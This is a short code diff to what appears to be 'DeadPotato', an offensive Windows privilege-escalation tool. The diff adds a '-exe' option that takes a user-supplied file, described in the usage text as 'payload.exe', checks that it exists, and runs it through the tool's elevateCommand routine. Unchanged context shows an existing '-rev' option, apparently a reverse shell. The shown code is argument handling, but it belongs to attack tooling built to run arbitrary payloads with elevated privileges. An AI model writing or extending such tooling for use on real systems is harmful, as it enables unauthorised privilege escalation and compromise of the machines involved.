@@ -42,6 +42,24 @@ namespace DeadPotato
                         elevateCommand("cmd /c " + joinedArguments);
                         break;
 
+                    case "-exe":
+
+                        if (args.Length == 1)
+                        {
+                            UI.printColor($"(<darkred>-</darkred>) Unspecified File.\nUsage: <yellow>deadpotato.exe -exe payload.exe</yellow>.");
+                            Environment.Exit(0);
+                        }
+
+                        if (!File.Exists(args[1]))
+                        {
+                            UI.printColor($"(<darkred>-</darkred>) The provided file does not exist.\nUsage: <yellow>deadpotato.exe -exe payload.exe</yellow>.");
+                            Environment.Exit(0);
+                        }
+
+                        elevateCommand(args[1]);
+
+                        break;
+
                     case "-rev":
 
                         if (args.Length == 1)
